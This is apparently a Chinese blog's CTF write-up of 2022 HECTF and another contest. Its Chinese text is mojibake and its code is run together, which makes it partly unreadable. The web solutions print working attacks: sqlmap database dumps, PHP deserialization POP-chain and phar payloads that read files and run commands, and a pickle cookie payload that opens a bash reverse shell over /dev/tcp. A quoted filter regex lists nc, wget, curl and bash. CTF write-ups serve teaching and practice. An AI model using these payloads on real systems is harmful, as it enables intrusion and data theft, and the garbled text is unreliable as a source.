&#x27;8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF&#x27;.lower()s = [s[32*i:32*i+32] for i in range(len(s)//32)]dic = &#123;&#125;for k in range(32,127): dic[md5(chr(k).encode()).hexdigest()] = chr(k)flag = &#x27;&#x27;for k in s: flag += dic[k]print(flag)# flag&#123;welcome_to_misc&#125; â€‹ MY PICTUREå°†datæ–‡ä»¶å¼‚æˆ–0x8eï¼Œè§£å‹å¾—åˆ°encode.pyï¼Œå†…ä¸ºå›¾ç‰‡åŠ å¯†ç®—æ³•ï¼Œé€»è¾‘ä¸ºé€åƒç´ RGBå€¼ç®€å•å¼‚æˆ–ï¼Œè¿˜åŸå³å¯ï¼š 12345678910111213141516from PIL import Imagec = Image.open(r&#x27;flag.png&#x27;,&#x27;r&#x27;)l,h = c.sizeprint(l,h)m = Image.new(&#x27;RGB&#x27;,(h,l))for i in range(l): for j in range(h): r1,g1,b1 = c.getpixel((i,j)) r = g1^b1 g = r1^r b = g1^g m.putpixel(((i*1200+j)//787,(i*1200+j)%787),(b,g,r))m.save(r&#x27;flag.jpg&#x27;)c.close()m.close() è¿˜åŸå›¾ç‰‡ä¸­çš„flagï¼šUNCTF&#123;93bb442f-2a76-2b6f-c42f-c2297f5fdaf9&#125;ã€‚ â€‹ è´æ–¯å®¶æ—çš„ä¾µç•¥ æç¤º1ï¼šå¦‚æœæ˜æ–‡æ”»å‡»å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨bandzip æç¤º2ï¼šä¼šåŠ¨çš„é¼ æ ‡ ç¬¬ä¸€å±‚ï¼Œæ ¹æ®æç¤º1ï¼Œbandzipå‹ç¼©åæ˜æ–‡æ”»å‡»ï¼Œè§£å‹ï¼› ç¬¬äºŒå±‚ï¼Œbase64éšå†™ï¼Œè„šæœ¬æå–éšå†™å†…å®¹ï¼š 123456789101112# -*- coding: utf-8 -*-b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f: bin_str = &#x27;&#x27; for line in f.readlines(): stegb64 = &#x27;&#x27;.join(line.split()) rowb64 = &#x27;&#x27;.join(stegb64.decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).split()) offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])) equalnum = stegb64.count(&#x27;=&#x27;) #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])) #8 ä½ä¸€ç»„ å¾—åˆ°çš„å†…å®¹16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼› ç¬¬ä¸‰å±‚ï¼Œæ ¹æ®æ–‡ä»¶å†…çš„æç¤º Macro.mrfï¼ŒçŒœæµ‹ä¸ºé¼ æ ‡è½¨è¿¹è®°å½•ï¼Œä½¿ç”¨Macro Recorderå·¥å…·æ‰“å¼€ï¼Œé€æ¡æŸ¥çœ‹è½¨è¿¹å¾—åˆ°flagï¼šflag&#123;b4s3_1s_v3ry_g0od!!&#125;ã€‚ â€‹","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022èµ›","slug":"2022èµ›","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2022 HECTF","slug":"match-2022-HECTF","date":"2022-11-07T13:38:28.000Z","updated":"2022-11-28T16:24:14.457Z","comments":true,"path":"2022/11/07/match-2022-HECTF/","permalink":"https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/","excerpt":"","text":"â€‹ 2022HECTFæ˜¯ç”±æ²³åŒ—å¸ˆèŒƒå¤§å­¦SourceCodeæˆ˜é˜Ÿç»„ç»‡çš„é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„CTFç«æŠ€æ´»åŠ¨ï¼Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦è®¡ç®—æœºä¸ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢ä¸»åŠï¼Œæ²³åŒ—çœç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é‡ç‚¹å®éªŒå®¤å’Œæ²³åŒ—å¸ˆèŒƒå¤§å­¦ä¿¡æ¯å®‰å…¨åä¼šæ‰¿åŠï¼Œæ˜¯é¢å‘å…¨å›½å¤§å­¦ç”Ÿçš„ä¸€æ¬¡ç«æŠ€æ´»åŠ¨ã€‚ Rank: 1 Webè¿·è·¯çš„å°ç‹® ç­¾åˆ°é¢˜ HINTS: å®˜ç½‘åœ°å€éœ€å¡«å†™å®Œæ•´(å»ºè®®å¤åˆ¶)ï¼Œæ— è·¯å¾„å³ç»“å°¾ä¸º.cn è¿›å…¥æ˜¯è¿·æƒ‘æ€§çš„404é¡µé¢ï¼Œä¸”å³é”®å’ŒF12ç¦ç”¨ï¼Œåœ°å€æ æ‰‹åŠ¨æ·»åŠ  view-source: çœ‹åˆ°æºç æç¤º hectferã€‚ è®¿é—® /hectfer æç¤º hebnu is a good site.ï¼Œè®¿é—® /hebnu æç¤º Can you use another way of requesting? ä¸Šburpsuiteï¼ŒæŒ‰æç¤ºæŒ‰æ­¥éª¤ä¿®æ”¹request headerçš„å‡ å¤„ä¸ºï¼š 1234POST /hebnu HTTP/1.1User-Agent: Internet ExplorerReferer: https://www.hebtu.edu.cnX-Forwarded-For: 127.0.0.1 åœ¨responce headeré‡Œçœ‹åˆ°PHPFuckä»£ç ï¼Œæ§åˆ¶å°è¿è¡Œç›´æ¥å¾—åˆ°flagï¼šHECTF&#123;sfe2fsa_f39sjfa_hj93sf_ef0skf3fs&#125;ã€‚ â€‹ æ“å¤©æ³¨æ‰¾åˆ°GETå‚æ•°idï¼Œç”¨sqlmapå¯ä»¥ç›´æ¥é€šè¿‡æ—¶é—´ç›²æ³¨è·‘å‡ºflagã€‚ å‘½ä»¤ï¼š 12345678# çˆ†æ•°æ®åº“åsqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; --dbs# æ•°æ®åº“åctfï¼Œçˆ†è¡¨åsqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; -D ctf --tables# æ•°æ®åº“åctfï¼Œè¡¨å3eDf4f07efC9ee16ï¼Œçˆ†åˆ—åå’Œå†…å®¹sqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; -D ctf -T 3eDf4f07efC9ee16 --columns --dump â€‹ easy_unserialize ä¸€é“ç¥å¥‡çš„ååºåˆ—åŒ–é¢˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phperror_reporting(0);class A&#123; public $file; public function __construct()&#123; echo &quot;Welcome to HECTF Have fun!!!ğŸ˜Š&lt;br&gt;&quot;; &#125; public function __wakeup()&#123; if(isset($this-&gt;file-&gt;var))&#123; $this-&gt;file = &quot;flag.php&quot;; &#125; else&#123; $this-&gt;file = &quot;index.php&quot;; &#125; &#125; public function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;class B&#123; public $str; public $huang; public function __isset($arg) &#123; echo &quot;éš¾é“æˆ‘çœŸçš„è¦å¤±è´¥äº†ï¼Œå—&quot;.$this-&gt;str; &#125; public function __call($fun1,$arg) &#123; return $this-&gt;huang-&gt;str; &#125;&#125;class C&#123; public $eee; public $aaa=&quot;who are you?&quot;; public $ccc; public function __toString() &#123; $this-&gt;eee-&gt;flag(); &#125; public function __get($css) &#123; $function = $this-&gt;ccc; return $function(); &#125;&#125;class D&#123; private $ddd; private $ext; public function flag()&#123; $this-&gt;ext-&gt;nisa($this-&gt;ddd); &#125; public function __invoke() &#123; echo new $this-&gt;ddd($this-&gt;ext); &#125;&#125;$gagaga = new A();unserialize(serialize($gagaga));$data = $_POST[&#x27;data&#x27;];unserialize($data); æ„é€ ååºåˆ—åŒ–é“¾ï¼š A:__wakeup() =&gt; B:__isset() =&gt; C:__toString() =&gt; D:flag() =&gt; B:__call() =&gt; C:__get() =&gt; D:__invoke() =&gt; echo new() åˆ©ç”¨å†…ç½®ç±» DirectoryIterator + glob://ä¼ªåè®®åˆ—ç›®å½•ï¼š 12345678910111213141516171819202122232425262728293031323334353637from phpserialize import serializefrom urllib.parse import quoteclass D: private_ddd = &#x27;DirectoryIterator&#x27; private_ext = &#x27;glob:///*f*&#x27; class C: public_ccc = D() public_eee = &#x27;?&#x27; public_aaa = &#x27;?&#x27; class B: public_str = &#x27;?&#x27; public_huang = C() class D: private_ddd = &#x27;?&#x27; private_ext = B()class C: public_ccc = &#x27;?&#x27; public_eee = D() public_aaa = &#x27;?&#x27;class B: public_str = C() public_huang = &#x27;?&#x27; class A: public_file = B()print(quote(serialize(A())))# POST payload:# data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A17%3A%22DirectoryIterator%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A11%3A%22glob%3A///%2Af%2A%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D# æ–‡ä»¶å /ffflllllaaaaaaggggg.txt å†åˆ©ç”¨å†…ç½®ç±» SplFileObject + php://filterä¼ªåè®®è¯»æ–‡ä»¶å†…å®¹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738from phpserialize import serializefrom urllib.parse import quoteclass D: private_ddd = &#x27;SplFileObject&#x27; private_ext = &#x27;php://filter/read=convert.base64-encode/resource=/ffflllllaaaaaaggggg.txt&#x27; class C: public_ccc = D() public_eee = &#x27;?&#x27; public_aaa = &#x27;?&#x27; class B: public_str = &#x27;?&#x27; public_huang = C() class D: private_ddd = &#x27;?&#x27; private_ext = B()class C: public_ccc = &#x27;?&#x27; public_eee = D() public_aaa = &#x27;?&#x27;class B: public_str = C() public_huang = &#x27;?&#x27; class A: public_file = B()print(quote(serialize(A())))# POST payload# data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A73%3A%22php%3A//filter/read%3Dconvert.base64-encode/resource%3D/ffflllllaaaaaaggggg.txt%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D# HECTF&#123;u_find_m# y_trulyself&#125; â€‹ cute_pipiè§‚å¯Ÿé¡µé¢ï¼Œæœ‰å›¾ç‰‡ä¸Šä¼ ç‚¹ï¼Œurlå‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œåˆ©ç”¨ä¼ªåè®®è¯»æºç ï¼š index.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phperror_reporting(0);define(&#x27;FROM_INDEX&#x27;, 1);include(&#x27;class.php&#x27;);$file=$_POST[&#x27;file&#x27;];$show = empty($_GET[&#x27;show&#x27;]) ? &#x27;home&#x27; : $_GET[&#x27;show&#x27;];if(!is_string($show) || preg_match(&#x27;/\\.\\./&#x27;, $show) || preg_match(&#x27;/zip/i&#x27;,$show)) die(&#x27;Not this !!!&#x27;);ob_start(&#x27;ob_gzhandler&#x27;);function page_tshow($show) &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div id=&quot;header&quot;&gt; &lt;center&gt;&lt;a href=&quot;?show=home&quot; class=&quot;logo&quot;&gt;&lt;img src=&quot;images/logo.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/center&gt; &lt;/div&gt; &lt;div id=&quot;body&quot;&gt;&lt;?php&#125;function fatal($msg) &#123;?&gt;&lt;div class=&quot;article&quot;&gt;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;&lt;/div&gt;&lt;?phpexit(1);&#125;page_tshow($show);if(!(include $show . &#x27;.php&#x27;)) fatal(&#x27;no no no&#x27;);if(isset($file))&#123; if(file_exists($file)) echo $file.&quot; surely exists&quot;; else echo $file.&quot; dont exist&quot;;&#125;?&gt; home.php 12345678910111213&lt;?phpinclude &#x27;common.php&#x27;;?&gt;&lt;center&gt;&lt;div class=&quot;article&quot;&gt; &lt;h2&gt;Welcome to HECTF ï¼ï¼ï¼&lt;/h2&gt; &lt;p&gt; Click here to upload your file =&gt; &lt;a href=&quot;?show=upload&quot;&gt;ä¼ é€é—¨&lt;/a&gt; &lt;/p&gt;&lt;/div&gt;&lt;/center&gt; upload.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpinclude &#x27;common.php&#x27;;if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; isset($_FILES[&#x27;image&#x27;])) &#123; $fn = $_FILES[&#x27;image&#x27;][&#x27;tmp_name&#x27;]; $ft = $_FILES[&#x27;image&#x27;][&#x27;type&#x27;]; if(!is_uploaded_file($fn)) &#123; fatal(&#x27;uploaded file corrupted&#x27;); &#125; $array = array(&#x27;image/png&#x27;); if(!in_array($ft,$array))&#123; fatal(&quot;No, I want png picture áµ•á·„Î¹ Ì áµ•á·…&quot;); &#125; $imagekey = create_image_key(); move_uploaded_file($fn, &quot;uploads/$imagekey.png&quot;); header(&quot;Location: ?show=show&amp;imagekey=$imagekey&quot;);&#125; else &#123;?&gt;&lt;center&gt;&lt;div class=&quot;article&quot;&gt; &lt;h2&gt;Plz Give me a file I want.&lt;/h2&gt; &lt;form enctype=&quot;multipart/form-data&quot; action=&quot;?show=upload&quot; method=&quot;POST&quot;&gt; &lt;label for=&quot;image&quot;&gt;áµ•á·„Î¹ Ì áµ•á·… &lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;image&quot; name=&quot;image&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Upload&quot; /&gt; &lt;/form&gt;&lt;/div&gt;&lt;/center&gt;&lt;?php&#125;?&gt; common.php 123456789101112131415161718192021&lt;?phpif(!defined(&#x27;FROM_INDEX&#x27;)) die();define(&#x27;MAX_IM_SIZE&#x27;, 100);function create_image_key() &#123; return sha1($_SERVER[&#x27;REMOTE_ADDR&#x27;] . $_SERVER[&#x27;HTTP_USER_AGENT&#x27;] . time() . mt_rand());&#125;function load_image($imagekey) &#123; if(1 !== preg_match(&#x27;/[0-9a-f]&#123;40&#125;/&#x27;, $imagekey)) &#123; fatal(&#x27;Invalid image key.&#x27;); &#125; $im = imagecreatefrompng(&quot;uploads/&#123;$imagekey&#125;.png&quot;); if(!$im) &#123; fatal(&#x27;Failed to load image.&#x27;); &#125; return $im;&#125;?&gt; class.php 12345678910111213&lt;?phpclass HeCTF&#123; public $hectf; public $cmd; public function __destruct()&#123; if( isset($this-&gt;hectf) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;,$this-&gt;hectf) &amp;&amp; intval($this-&gt;hectf)) if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;, $this-&gt;cmd))&#123; die(&#x27;No no no no no!&#x27;); &#125; exec($this-&gt;cmd); &#125;&#125; å®¡è®¡æºç ï¼Œå›¾ç‰‡ä¸Šä¼ ç‚¹+file_exists()å‡½æ•°+è‡ªå®šä¹‰HeCTFç±»ï¼Œåˆ¤æ–­ä¸ºæ–‡ä»¶ä¸Šä¼ +pharååºåˆ—åŒ–åˆ©ç”¨ã€‚ HeCTFç±»ä¸­RCEä½¿ç”¨ tee å‘½ä»¤ç»•è¿‡è¿‡æ»¤å†™æ–‡ä»¶ã€‚ æ„é€ pharæ–‡ä»¶ï¼š 12345678910111213141516&lt;?phpclass HeCTF&#123; public $hectf; public $cmd;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $o = new HeCTF(); $o-&gt;hectf = array(&#x27;x&#x27;);$o-&gt;cmd = &#x27;ls / | tee 1&#x27;;$phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); å°†ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹ä¸ºpngåç¼€ä¸Šä¼ ï¼Œåœ¨index.phpä»¥POSTæ–¹å¼ä¼ å…¥fileå€¼ï¼Œåˆ©ç”¨pharä¼ªåè®®ååºåˆ—åŒ–RCEï¼š POST: file=phar://uploads/25c3a34d93227241d5dacc8eb84a80ef2aabeab1.png è¯»åˆ°flagæ–‡ä»¶å /ffflllllaaaagggï¼ŒåŒæ ·æ“ä½œæ„é€ è¯»flagå†…å®¹çš„pharæ–‡ä»¶ï¼š 12345678910111213141516&lt;?phpclass HeCTF&#123; public $hectf; public $cmd;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $o = new HeCTF(); $o-&gt;hectf = array(&#x27;x&#x27;);$o-&gt;cmd = &#x27;cat /ffflllllaaaaggg | tee 1&#x27;;$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); â€‹ çš®æ‰£çš„å•†åº—è¿›å…¥é¡µé¢å‘ç°å¯ä»¥ç‚¹å‡»æŒ‰é’®ï¼Œä½†æ˜¯æ²¡é’±å¯ç”¨ï¼Œç‚¹å‡»æ—¶å‘ç°cookieæ˜¯å˜åŒ–çš„ã€‚ cookieåƒbase64ï¼Œè§£ç ï¼Œç»“åˆé¢˜ç›®å¯çŸ¥ä¸ºjsonçš„pickleåºåˆ—åŒ–ç»“æœï¼Œåæ¨ä¸€ä¸‹ï¼š 12345678import picklefrom base64 import *enc = &quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;print(pickle.loads(b64decode(enc)))# &#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125; å¯è§ä½¿ç”¨äº†hmacå“ˆå¸Œï¼Œæ— æ³•çˆ†ç ´ï¼Œä½†å¯ä»¥æ„é€ RCEä»£ç åºåˆ—åŒ–åæ”¾å…¥cookieï¼Œç‚¹å‡»æŒ‰é’®æ‰§è¡Œæ¶æ„ä»£ç ï¼Œç”±äºé¡µé¢æ— ç»“æœå›æ˜¾ï¼Œæ„é€ åå¼¹shellä»£ç ï¼š 12345678import base64import pickleclass A(object): def __reduce__(self): return (eval, (&quot;bash -c \\&quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1\\&quot;&quot;,))a = A()print(base64.b64encode(pickle.dumps(a))) æ›¿æ¢cookieåï¼Œç‚¹å‡»æŒ‰é’®å³å¯åœ¨vps getshellæ‹¿flagã€‚ â€‹ Reverseè´æ–¯å˜è¡¨base32ï¼ŒCyberchefä¸€æŠŠæ¢­å¾—åˆ°flagã€‚ â€‹ apk å¦‚ä½•åˆ†æApkå‘¢ ç”¨jadxæ‰“å¼€apkï¼Œåœ¨AndroidManifest.xmlé‡Œå‘ç°ï¼š &lt;meta-data android:name=&quot;çˆ¶æ‹‰å“¥&quot; android:value=&quot;ä»˜æ‹‰å“¥å¤´&#123;Apktool_or_jadx&#125;&quot;/&gt; flagï¼šHECTF&#123;Apktool_or_jadx&#125; â€‹ HelloIos ç®€å•çš„ios æ‰¾åˆ°å…³é”®åŠ å¯†å‡½æ•°ï¼Œç®€å•å¼‚æˆ–è¿˜åŸflagã€‚ â€‹ ezre easy reverse åŠ å¯†é€»è¾‘å¾ˆéš¾çœ‹ï¼Œåˆ©ç”¨IDAçš„findcryptæ’ä»¶å¯ä»¥è¯†åˆ«å‡ºå­˜åœ¨SM4åŠ å¯†ç®—æ³•çš„å…³é”®å‚æ•°æ•°ç»„ã€‚ åˆ©ç”¨åŠ¨è°ƒæ‰¾åˆ°SM4åŠ å¯†ä½¿ç”¨çš„128ä½keyå€¼ï¼Œå¯¼å‡ºhexï¼šAD763B4FCDCFD9251089FB0408A45F80ï¼Œä»¥åŠ128bitå¯†æ–‡ï¼Œå¯¼å‡ºhexï¼šD75CDA22176DD392A1A570915F66A61Cã€‚ æ‰¾ä¸€ä¸ªSM4ç®—æ³•çš„pythonè„šæœ¬è§£å¯†å¾—åˆ°flagï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192class SM4Cipher: def __init__(self, key: bytes): if not len(key) == 16: raise ValueError(&quot;SM4 key must be length of 16. &quot;) self._key_r = self._generate_key(key) self.block_size = 16 def encrypt(self, plaintext: bytes): return self._do(plaintext, self._key_r) def decrypt(self, ciphertext: bytes): return self._do(ciphertext, self._key_r[::-1]) def _do(self, text: bytes, key_r: list): text_ = [0 for _ in range(4)] # å°† 128bit è½¬åŒ–æˆ 4x32bit for i in range(4): text_[i] = int.from_bytes(text[4 * i:4 * i + 4], &#x27;big&#x27;) for i in range(32): box_in = text_[1] ^ text_[2] ^ text_[3] ^ key_r[i] box_out = self._s_box(box_in) temp = text_[0] ^ box_out ^ self._rot_left(box_out, 2) ^ self._rot_left(box_out, 10) temp = temp ^ self._rot_left(box_out, 18) ^ self._rot_left(box_out, 24) text_ = text_[1:] + [temp] text_ = text_[::-1] # ç»“æœé€†åº # å°† 4x32bit åˆå¹¶æˆ 128bit result = bytearray() for i in range(4): result.extend(text_[i].to_bytes(4, &#x27;big&#x27;)) return bytes(result) def _generate_key(self, key: bytes): &quot;&quot;&quot;å¯†é’¥ç”Ÿæˆ&quot;&quot;&quot; key_r, key_temp = [0 for _ in range(32)], [0 for _ in range(4)] FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] CK = [0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279] # å°† 128bit æ‹†åˆ†æˆ 4x32bit for i in range(4): temp = int.from_bytes(key[4 * i:4 * i + 4], &#x27;big&#x27;) key_temp[i] = temp ^ FK[i] # å¾ªç¯ç”Ÿæˆè½®å¯†é’¥ for i in range(32): box_in = key_temp[1] ^ key_temp[2] ^ key_temp[3] ^ CK[i] box_out = self._s_box(box_in) key_r[i] = key_temp[0] ^ box_out ^ self._rot_left(box_out, 13) ^ self._rot_left(box_out, 23) key_temp = key_temp[1:] + [key_r[i]] return key_r @staticmethod def _s_box(n: int): BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] result = bytearray() # å°† 32bit æ‹†åˆ†æˆ 4x8bitï¼Œä¾æ¬¡è¿›è¡ŒSç›’å˜æ¢ for item in list(n.to_bytes(4, &#x27;big&#x27;)): result.append(BOX[item]) return int.from_bytes(result, &#x27;big&#x27;) @staticmethod def _rot_left(n, m): &quot;&quot;&quot;å¾ªç¯å·¦ç§»&quot;&quot;&quot; return ((n &lt;&lt; m) | (n &gt;&gt; (32 - m))) &amp; 0xFFFFFFFF key = 